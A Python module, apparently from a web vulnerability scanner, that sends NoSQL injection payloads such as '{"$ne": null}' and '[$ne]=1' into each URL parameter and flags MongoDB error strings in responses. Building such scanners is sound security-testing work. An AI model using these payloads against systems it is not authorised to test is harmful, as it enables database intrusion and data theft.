from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.colors import console

NOSQL_ERRORS = [
    "mongoerror",
    "mongo",
    "$where",
    "unexpected token",
    "json parse error",
    "cast to objectid failed",
]

NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    "' || '1'=='1",
    '"; return true; var x="',
    "[$ne]=1",
]

def check_nosqli(requester, url):
    result = {"name": "NoSQL Injection", "findings": [], "vulnerable": []}
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        console.print("[dim]    i No parameters found, skipping[/dim]")
        return result
    console.print(f"[info]  -> Testing {len(params)} param(s) with {len(NOSQL_PAYLOADS)} payloads...[/info]")
    for param in params:
        console.print(f"[dim]    -> Param: {param}[/dim]")
        for i, payload in enumerate(NOSQL_PAYLOADS, 1):
            console.print(f"[dim]      [{i}/{len(NOSQL_PAYLOADS)}] {payload[:40]}[/dim]")
            q = params.copy()
            q[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
            resp = requester.get(test_url)
            if not resp:
                continue
            body = resp.text.lower()
            for err in NOSQL_ERRORS:
                if err in body:
                    console.print(f"[vuln]    !! NoSQL injection possible via {param}! Pattern: {err}[/vuln]")
                    result["vulnerable"].append({"param": param, "payload": payload})
                    result["findings"].append({
                        "severity": "critical",
                        "msg": f"NoSQL injection possible via param: {param}",
                    })
                    break
    if not result["vulnerable"]:
        console.print("[success]    + No NoSQL injection found[/success]")
    return result
